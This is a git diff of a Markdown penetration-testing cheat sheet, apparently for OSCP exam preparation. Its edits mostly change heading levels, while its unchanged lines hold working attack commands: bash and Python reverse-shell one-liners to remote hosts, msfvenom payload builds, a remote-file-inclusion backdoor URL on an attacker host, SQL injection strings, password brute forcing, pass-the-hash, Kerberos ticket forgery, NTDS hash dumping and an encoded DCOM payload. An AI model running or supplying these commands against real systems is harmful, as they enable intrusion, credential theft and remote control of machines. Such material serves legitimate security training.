@@ -73,7 +73,7 @@ useradd -u UID -g group user
 
 ---
 
-# Port Scanning
+## Port Scanning
 
 ```bash
 # use -Pn option if you're getting nothing in scan
@@ -101,7 +101,7 @@ Test-NetConnection -Port <port> IP
 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null 
 ```
 
-# FTP enumeration
+## FTP enumeration
 
 ```bash
 ftp IP
@@ -125,7 +125,7 @@ hydra -v -C /usr/share/seclists/seclists-master/Passwords/Default-Credentials/ft
 # check for vulnerabilities associated with the version identified.
 ```
 
-# SSH enumeration
+## SSH enumeration
 
 ```bash
 # Login
@@ -145,7 +145,7 @@ hydra -l user -P passwords.txt IP ssh # '-L' for usernames list, '-l' for userna
 # check for vulnerabilities associated with the version identified.
 ```
 
-# SMB enumeration
+## SMB enumeration
 
 ```bash
 # Automated
@@ -195,7 +195,7 @@ put <file> # to upload file
 get <file> # to download file
 ```
 
-- Downloading shares made easy - if the folder consists of several files, they all be downloading by this.
+### Downloading shares made easy - if the folder consists of several files, they all be downloading by this.
 
 ```bash
 mask ""
@@ -204,7 +204,7 @@ prompt OFF
 mget *
 ```
 
-# HTTP/S enumeration
+## HTTP/S enumeration
 
 - View source-code and identify any hidden content. If some image looks suspicious download and try to find hidden data in it.
 - Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.
@@ -213,7 +213,7 @@ mget *
 - Nikto
 - If hostname discovered, add to `/etc/hosts` file.
 
-## Basic HTTP/S Enum
+### Basic HTTP/S Enum
 ```bash
 gobuster dir -u $URL -w /usr/share/wordlists/dirb/big.txt
 gobuster dir -u $URL -w /opt/seclists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30
@@ -221,7 +221,7 @@ gobuster dir -u $URL -w /opt/seclists/Discovery/Web-Content/raft-medium-files.tx
 ffuf -c -ic -w /usr/share/wordlists/dirb/big.txt -u $URL
 ```
 
-## Advanced file/directory fuzzing
+### Advanced file/directory fuzzing
 ```bash
 # Authenticated Directory Fuzzing:
 ffuf -c -ic -w /opt/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 -d "SESSIONID=value" "$URL"
@@ -248,7 +248,7 @@ ffuf -c -ic -w /opt/seclists/Discovery/Web-Content/burp-parameter-names.txt "$UR
 
 ```
 
-## Nikto
+### Nikto
 ```bash
 # Basic
 nikto -h http://$target/
@@ -259,7 +259,7 @@ nikto --host $IP -ssl -evasion 1
 - `HTTPS`SSL certificate inspection, this may reveal information like subdomains, usernames…etc
 - Default credentials, Identify the CMS or service and check for default credentials and test them out.
 
-## Bruteforce
+### Bruteforce
 
 ```bash
 hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
@@ -271,7 +271,7 @@ hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:na
 - if `cgi-bin` is present then do further fuzzing and obtain files like .sh or .pl
 - Check if other services like FTP/SMB or anyothers which has upload privileges are getting reflected on web.
 
-## API - Fuzz further and it can reveal some sensitive information
+### API - Fuzz further and it can reveal some sensitive information
 ```bash
 # identifying endpoints using gobuster
 # pattern can be like {GOBUSTER}/v1 here v1 is just for example, it can be anything
@@ -284,7 +284,7 @@ curl -i http://192.168.50.16:5002/users/v1
 - Check the URL, whether we can leverage **Local or Remote File Inclusion**.
 - Also check if there’s any file upload utility(also obtain the location it’s getting reflected)
 
-## GitHub
+### GitHub
 
 You need to find the `.git` files on the target machine.
 
@@ -301,7 +301,7 @@ git show <commit-id>
 - If you identify `.git` active on the website. Use https://github.com/arthaud/git-dumper now it downloads all the files and saves it locally. Perform the same above commands and escalate.
 - [https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets](https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets)
 
-## Wordpress
+### Wordpress
 
 ```bash
 # basic usage
@@ -327,13 +327,13 @@ wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.
 wpscan --url $URL --enumerate p --plugins-detection aggressive
 ```
 
-## Drupal
+### Drupal
 
 ```bash
 droopescan scan drupal -u http://site
 ```
 
-## Joomla
+### Joomla
 
 ```bash
 droopescan scan joomla --url http://site
@@ -341,12 +341,12 @@ droopescan scan joomla --url http://site
 sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr username  
 ```
 
-## S1ren's Commons
+### S1ren's Commons
 
 From her walkthrough videos, her common commands available at:
 https://sirensecurity.io/blog/common/ 
 
-# DNS enumeration
+## DNS enumeration
 
 - Better use `seclists` wordlists for better enumeration. [https://github.com/danielmiessler/seclists/tree/master/Discovery/DNS](https://github.com/danielmiessler/seclists/tree/master/Discovery/DNS)
 
@@ -375,7 +375,7 @@ nslookup mail.megacorptwo.com
 nslookup -type=TXT info.megacorptwo.com IP 
 ```
 
-# SMTP enumeration
+## SMTP enumeration
 
 ```bash
 # Version Detection
@@ -387,7 +387,7 @@ smtp-user-enum -M VRFY -U username.txt -t IP
 sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 
-# LDAP Enumeration
+## LDAP Enumeration
 
 ```powershell
 # try on both ldap and ldaps, this is first command to run if you dont have any valid credentials
@@ -418,14 +418,14 @@ python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --da
 python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privileged-users
 ```
 
-# NFS Enumeration
+## NFS Enumeration
 
 ```bash
 nmap -sV --script=nfs-showmount IP
 showmount -e IP
 ```
 
-# SNMP Enumeration
+## SNMP Enumeration
 
 ```bash
 # Nmap UDP scan
@@ -455,7 +455,7 @@ snmpwalk -c public -v1 IP 1.3.6.1.2.1.6.13.1.3
 1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
 ```
 
-# RPC Enumeration
+## RPC Enumeration
 
 ```powershell
 rpcclient -U=user $IP
@@ -489,9 +489,7 @@ netshareenumall
 lsaenumsid 
 ```
 
----
-
-# RDP
+## RDP
 
 ```bash
 xfreerdp /u:user /p:'password' /v:$target
@@ -500,14 +498,15 @@ xfreerdp /d:domain /u:user /p:'password' /v:$target
 # try this option if normal login doesn't work
 xfreerdp /u:user /p:'password' /v:$target +clipboard /cert:ignore
 ```
+---
 
-# Web Attacks
+## Web Attacks
 
 <aside>
 Cross-platform PHP revershell: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
 </aside>
 
-## Directory Traversal
+### Directory Traversal
 
 ```bash
 # displaying content through absolute path
@@ -529,17 +528,18 @@ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../.
 http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt 
 ```
 
-- URL Encoding
+### Maybe try URL Encoding?
 
 ```bash
 # Sometimes it doesn't show if we try path, then we need to encode them
 curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```
 
-- Wordpress
+### More Wordpress
+
     - Simple exploit: https://github.com/leonjza/wordpress-shell
 
-## Local File Inclusion
+### Local File Inclusion
 
 - Main difference between Directory traversal and this attack is, here we’re able to execute commands remotely.
 
@@ -558,17 +558,17 @@ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%
 curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php 
 ```
 
-## Remote file inclusion
+### Remote file inclusion
 
 ```bash
 1. Obtain a php shell
 2. host a file server 
-3.
-http://mountaindesserts.com/meteor/index.php?page=http://attacker-ip/simple-backdoor.php&cmd=ls
-we can also host a php reverseshell and obtain shell.
+3. http://mountaindesserts.com/meteor/index.php?page=http://attacker-ip/simple-backdoor.php&cmd=ls
+
+# We can also host a php reverseshell and obtain shell.
 ```
 
-## SQL Injection
+### SQL Injection
 
 ```
 admin' or '1'='1
@@ -595,14 +595,14 @@ admin' or '1'='1
 ) or '1`='1-
 ```
 
-## Blind SQL Injection - This can be identified by Time-based SQLI
+### Blind SQL Injection - This can be identified by Time-based SQLI
 
 ```bash
 # Application takes some time to reload, here it is 3 seconds
 http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
 ```
 
-## Manual Code Execution
+### Manual Code Execution
 
 ```bash
 # To login
@@ -620,7 +620,7 @@ EXECUTE xp_cmdshell 'whoami';
 http://192.168.45.285/tmp/webshell.php?cmd=id # Command execution
 ```
 
-## SQLMap - Automated Code execution
+### SQLMap - Automated Code execution
 
 ```bash
 # Testing on parameter names "user", we'll get confirmation
@@ -637,9 +637,9 @@ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
 
 ---
 
-# Exploits - Hack the planet!
+## Exploits - Hack the planet!
 
-## Searchsploit
+### Searchsploit
 
 ```bash
 searchsploit <name>
@@ -647,13 +647,13 @@ searchsploit <name>
 searchsploit -m windows/remote/46697.py 
 ```
 
-## Reverse Shells
+### Reverse Shells
 
 ```bash
 https://www.revshells.com/
 ```
 
-## Msfvenom
+### Msfvenom
 
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=<PORT> -f exe > shell-x86.exe
@@ -665,7 +665,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=<PORT> -f war > shell.war
 msfvenom -p php/reverse_php LHOST=IP LPORT=<PORT> -f raw > shell.php
 ```
 
-## One Liners
+### One Liners
 
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
@@ -681,7 +681,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 
 </aside>
 
-## Groovy reverse-shell
+### Groovy reverse-shell
 
 - For Jenkins
 
@@ -694,13 +694,13 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 ---
 
-# Windows Privilege Escalation
+## Windows Privilege Escalation
 
 <aside>
 findstr /SI /M "OS{" *.xml *.ini *.txt` - for finding files which contain OSCP flag..
 </aside>
 
-## Manual Enumeration commands
+### Manual Enumeration commands
 
 ```bash
 # Groups we're part of
@@ -736,7 +736,7 @@ Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.doc
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 ```
 
-## Automated Scripts
+### Automated Scripts
 
 ```s 
 winpeas.exe
@@ -746,7 +746,7 @@ powerup.ps1
 PrivescCheck.ps1
 ```
 
-## Token Impersonation
+### Token Impersonation
 
 - Command to check `whoami /priv`
 
@@ -770,7 +770,7 @@ SharpEfsPotato.exe -p C:\Windows\system32\Windowsbash\v1.0\bash.exe -a "whoami |
 # writes whoami command to w.log file
 ```
 
-## Binary Hijacking
+### Binary Hijacking
 
 ```python
 # Identify service from winpeas
@@ -783,7 +783,7 @@ sc config <service> <option>="<value>"
 sc start <servicename>
 ```
 
-## Unquoted Service Path
+### Unquoted Service Path
 
 ```bash
 # Displays services which has missing quotes, this can slo be obtained by running WinPEAS
@@ -794,7 +794,7 @@ icalcs "path"
 sc start <servicename>
 ```
 
-## Insecure Service Executables
+### Insecure Service Executables
 
 ```bash
 # In Winpeas look for a service which has the following
@@ -803,7 +803,7 @@ File Permissions: Everyone [AllAccess]
 sc start <service>
 ```
 
-## Weak Registry permissions
+### Weak Registry permissions
 
 ```bash
 # Look for the following in Winpeas services info output
@@ -820,7 +820,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND
 net start <service>
 ```
 
-## DLL Hijacking
+### DLL Hijacking
 
 1. Find Missing DLLs using Process Monitor, Identify a specific service which looks suspicious and add a filter.
 2. Check whether you have write permissions in the directory associated with the service.
@@ -835,7 +835,7 @@ C:\Windows\System32\spool\drivers\3\
 3. Copy it to victom machine and them move it to the service associated directory.(Make sure the dll name is similar to missing name)
 4. Start listener and restart service, you'll get a shell.
 
-## Autorun
+### Autorun
 
 ```bash
 # For checking, it will display some information with file-location
@@ -848,7 +848,7 @@ accesschk.exe \accepteula -wvu "<path>" # returns FILE_ALL_ACCESS
 # Replace the executable with the reverseshell and we need to wait till Admin logins, then we'll have shell
 ```
 
-## AlwaysInstallElevated
+### AlwaysInstallElevated
 
 ```bash
 # For checking, it should return 1 or Ox1
@@ -862,7 +862,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=<port> --platform windo
 msiexec /quiet /qn /i reverse.msi
 ```
 
-## Schedules Tasks
+### Schedules Tasks
 
 ```bash
 # Displays list of scheduled tasks, Pickup any interesting one
@@ -872,7 +872,7 @@ icalcs "path"
 # Wait till the scheduled task in executed, then we'll get a shell
 ```
 
-## Startup Apps
+### Startup Apps
 
 ```bash
 # Startup applications can be found here
@@ -881,7 +881,7 @@ C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
 # The only catch here is the system needs to be restarted
 ```
 
-## Insecure GUI apps
+### Insecure GUI apps
 
 ```bash
 # Check the applications that are running from "TaskManager" and obtain list of applications that are running as Privileged user
@@ -889,7 +889,7 @@ C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
 file://c:/windows/system32/cmd.exe 
 ```
 
-## SAM and SYSTEM
+### SAM and SYSTEM
 
 - Check in following folders
 
@@ -917,7 +917,7 @@ impacket-secretsdump -system SYSTEM -sam SAM local
 # Now a detailed list of hashes are displayed
 ```
 
-## Sensitive files
+### Sensitive files
 
 ```bash
 findstr /si password *.txt  
@@ -933,7 +933,7 @@ findstr /spin "password" *.*
 findstr /spin "password" *.*
 ```
 
-## Config files
+### Config files
 
 ```bash
 c:\sysprep.inf  
@@ -953,7 +953,7 @@ dir c:\*ultravnc.ini /s /b
 dir c:\ /s /b | findstr /si *vnc.ini
 ```
 
-## Registry
+### Registry
 
 ```bash
 reg query HKLM /f password /t REG_SZ /s
@@ -983,7 +983,7 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
-## RunAs - Savedcreds
+### RunAs - Savedcreds
 
 ```powershell
 # Displays stored credentials, looks for any optential users
@@ -992,7 +992,7 @@ cmdkey /list
 runas /savecred /user:admin C:\Temp\reverse.exe
 ```
 
-## Pass the Hash
+### Pass the Hash
 
 ```bash
 # If hashes are obtained though some means then use psexec, smbexec and obtain the shell as different user.
@@ -1001,11 +1001,11 @@ pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX2
 
 ---
 
-# Linux Privilege Escalation
+## Linux Privilege Escalation
 
 - [Privesc through TAR wildcard](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)
 
-## TTY Shell
+### TTY Shell
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -1016,7 +1016,7 @@ echo 'os.system('/bin/bash')'
 perl -e 'exec "/bin/sh";'
 ```
 
-## Basic
+### Basic
 
 ```bash
 find / -writable -type d 2>/dev/null
@@ -1036,7 +1036,7 @@ sudo tcpdump -i lo -A | grep "pass"
 
 ```
 
-## Automated Scripts
+### Automated Scripts
 
 ```bash
 linPEAS.sh
@@ -1046,7 +1046,7 @@ unix-privesc-check
 Mestaploit: multi/recon/local_exploit_suggester
 ```
 
-## Sensitive Information
+### Sensitive Information
 
 ```bash
 cat .bashrc
@@ -1057,7 +1057,7 @@ watch -n 1 "ps -aux | grep pass"
 # Process related information can also be obtained from PSPY
 ```
 
-## Sudo/SUID/Capabilities
+### Sudo/SUID/Capabilities
 
 [GTFOBins](https://gtfobins.github.io/)
 
@@ -1068,7 +1068,7 @@ find / -perm -u=s -type f 2>/dev/null
 getcap -r / 2>/dev/null
 ```
 
-## Cron Jobs
+### Cron Jobs
 
 ```bash
 # Detecting Cronjobs
@@ -1082,7 +1082,7 @@ pspy
 grep "CRON" /var/log/syslog 
 ```
 
-## NFS
+### NFS
 
 ```bash
 # Mountable share
@@ -1099,16 +1099,15 @@ chmod +x <binary>
 
 ---
 
-# Post Exploitation
+## Post Exploitation
 
 > This is more windows specific as exam specific.
 
 <aside>
-💡 Run WinPEAS.exe - This may give us some more detailed information as no we’re a privileged user and we can open several files, gives some edge!
-
+Run WinPEAS.exe - This may give us some more detailed information as no we’re a privileged user and we can open several files, gives some edge!
 </aside>
 
-## PowerShell History
+### PowerShell History
 
 ```bash
 type %userprofile%\AppData\Roaming\Microsoft\Windows\bash\PSReadline\ConsoleHost_history.txt
@@ -1117,14 +1116,14 @@ type %userprofile%\AppData\Roaming\Microsoft\Windows\bash\PSReadline\ConsoleHost
 type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\bash\PSReadline\ConsoleHost_history.txt 
 ```
 
-## Searching for passwords
+### Searching for passwords
 
 ```bash
 dir .s *pass* == *.config
 findstr /si password *.xml *.ini *.txt
 ```
 
-## Searching in Registry for Passwords
+### Searching in Registry for Passwords
 
 ```bash
 reg query HKLM /f password /t REG_SZ /s
@@ -1136,7 +1135,7 @@ reg query HKCU /f password /t REG_SZ /s
 
 </aside>
 
-## KDBX Files
+### KDBX Files
 
 ```powershell
 # These are KeyPassX password stored files
@@ -1149,23 +1148,23 @@ keepass2john Database.kdbx > keepasshash
 john --wordlist=/home/sathvik/Wordlists/rockyou.txt keepasshash
 ```
 
-## Dumping Hashes
+### Dumping Hashes
 
 1. Use Mimikatz
 2. If this is a domain joined machine, run BloodHound.
 
 ---
 
-# Active Directory Enumeration
+## Active Directory Enumeration
 
-## Enumeration
+### Enumeration
 
 ```powershell
 # to check local admins 
 net localgroup Administrators 
 ```
 
-## Powerview
+### Powerview
 
 ```powershell
 # loading module to bash, if it gives error then change execution policy
@@ -1205,7 +1204,7 @@ Get-DomainUser -PreauthNotRequired -verbose
 Get-NetUser -SPN | select serviceprincipalname 
 ```
 
-## Bloodhound
+### Bloodhound
 
 - Collection methods - database
 
@@ -1226,7 +1225,7 @@ sudo neo4j console
 # then upload the .json files obtained
 ```
 
-## LDAPDOMAINDUMP
+### LDAPDOMAINDUMP
 
 - These files contains information in a well structured webpage format.
 
@@ -1235,14 +1234,14 @@ sudo neo4j console
 sudo ldapdomaindump ldaps://IP -u 'username' -p 'password' 
 ```
 
-## PsLoggedon
+### PsLoggedon
 
 ```powershell
 # To see user logons at remote system of a domain(external tool)
 .\PsLoggedon.exe \\<computername>
 ```
 
-## GPP or CPassword
+### GPP or CPassword
 
 - Impacket
 
@@ -1281,18 +1280,18 @@ crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp
 gpp-decrypt "cpassword"
 ```
 
-# Active Directory Attacks
+## Active Directory Attacks
 
 <aside>
 💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don’t have proper creds.
 </aside>
 
-## Zerologon
+### Zerologon
 
 - [Exploit](https://github.com/VoidSec/CVE-2020-1472)
 - We can dump hashes on target even without any credentials.
 
-## Password Spraying
+### Password Spraying
 
 ```bash
 # Crackmapexec - check if the output shows 'Pwned!'
@@ -1303,11 +1302,11 @@ crackmapexec smb <IP or subnet> -u users.txt -p 'password' -d <domain> --continu
 kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 ```
 
-## AS-REP Roasting
+### AS-REP Roasting
 
 See https://github.com/Br14n41/asrep-roaster 
 
-## Kerberoasting
+### Kerberoasting
 
 ```bash
 # dumping from compromised windows host, and saving with customname
@@ -1320,7 +1319,7 @@ impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request
 hashcat -m 13100 hashes.txt wordlist.txt --force 
 ```
 
-## Silver Tickets
+### Silver Tickets
 
 - Obtaining hash of an SPN user using **Mimikatz**
 
@@ -1353,7 +1352,7 @@ ps> klist
 ps> iwr -UseDefaultCredentials <servicename>://<computername>
 ```
 
-## Secretsdump
+### Secretsdump
 
 ```bash
 impacket-secretsdump <domain>/<user>:<password>@IP
@@ -1363,16 +1362,16 @@ impacket-secretsdump user@IP -hashes lmhash:ntlmhash
 impacket-secretsdump domain/user@IP -hashes lmhash:ntlmhash 
 ```
 
-## Dumping NTDS.dit
+### Dumping NTDS.dit
 
 ```bash
 impacket-secretsdump <domain>/<user>:<password>@IP -just-dc-ntlm
 # use -just-dc-ntlm option with any of the secretsdump command to dump ntds.dit
 ```
 
-# Active Directory Lateral Movement
+## Active Directory Lateral Movement
 
-## psexec - smbexec - wmiexec - atexec
+### psexec - smbexec - wmiexec - atexec
 
 - Here we can pass the credentials or even hash, depending on what we have
 
@@ -1399,7 +1398,7 @@ impacket-atexec -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c4
 # we passed full hash here
 ```
 
-## winrs
+### winrs
 
 ```bash
 winrs -r:<computername> -u:<user> -p:<password> "command"
@@ -1407,7 +1406,7 @@ winrs -r:<computername> -u:<user> -p:<password> "command"
 # run this on windows session
 ```
 
-## crackmapexec
+### crackmapexec
 
 ```bash
 # supported services
@@ -1465,7 +1464,7 @@ crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz
 crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug' 
 ```
 
-## Crackmapexec database
+### Crackmapexec database
 
 ```bash
 # to launch the console
@@ -1474,7 +1473,7 @@ cmedb
 help 
 ```
 
-## Pass the ticket
+### Pass the ticket
 
 ```powershell
 .\mimikatz.exe
@@ -1484,7 +1483,7 @@ klist
 dir \\<RHOST>\admin$
 ```
 
-## DCOM
+### DCOM
 
 ```powershell
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.150.8"))
@@ -1495,7 +1494,7 @@ $dcom.Document.ActiveView.ExecuteShellCommand("bash",$null,"bash -nop -w hidden 
 AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
 ```
 
-## Golden Ticket
+### Golden Ticket
 
 1. Get the krbtgt hash
 
@@ -1525,7 +1524,7 @@ kerberos::ptt golden
 misc::cmd 
 ```
 
-## Shadow Copies
+### Shadow Copies
 
 ```bash
 vshadow.exe -nw -p C:
